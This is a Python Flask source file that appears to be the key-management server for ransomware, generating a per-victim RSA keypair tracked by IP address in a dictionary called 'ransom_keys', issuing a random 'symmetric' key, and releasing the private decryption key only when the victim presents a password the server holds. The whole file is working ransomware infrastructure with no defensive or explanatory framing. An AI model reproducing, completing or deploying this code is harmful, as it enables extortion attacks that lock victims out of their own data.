from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from flask import Flask,request
import base64
import random
import hashlib

global ransom_keys
ransom_keys = {}

global decryption_keys
decryption_keys = {}

def hash_pass(passw):
    dk = hashlib.pbkdf2_hmac('sha256', bytes(str(base64.b64encode(bytes(passw,"utf-8"))),'utf-8'), bytes(str("qwerty"),"utf-8"), 100000)
    passwd = dk.hex()
    return passwd

app = Flask(__name__)
@app.route("/")
def index():
    if request.remote_addr not in ransom_keys.keys():
        print("[+] Sending New")
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=8192,
            backend=default_backend()
        )
        public_key = private_key.public_key()
        pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )



        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        ransom_keys[request.remote_addr] = [pem,private_pem]
    else:
        print("[+] Sending Current !")
        pem = ransom_keys[request.remote_addr][0]
        private_pem = ransom_keys[request.remote_addr][1]


    return base64.b64encode(pem)

@app.route("/decrypt")
def decrypt():
    password = request.args.get('pass')
    if request.remote_addr in ransom_keys.keys() and password == decryption_keys[request.remote_addr]:
        return ransom_keys[request.remote_addr][1]
    else:
        return "Not Authorized !"

@app.route("/get_sym")
def symetric():
    return "".join([str(random.randint(0,9)) for _ in range(24)])

@app.route("/get_hash")
def get_hash():
    if not request.remote_addr in decryption_keys.keys():
        key = "".join([str(random.randint(0,9)) for _ in range(500)])
        print(key)
        passw = hash_pass(key)
        print(passw)
        decryption_keys[request.remote_addr] = key
        return passw
    else:
        return hash_pass(decryption_keys[request.remote_addr])


app.run(threaded=True, port=80)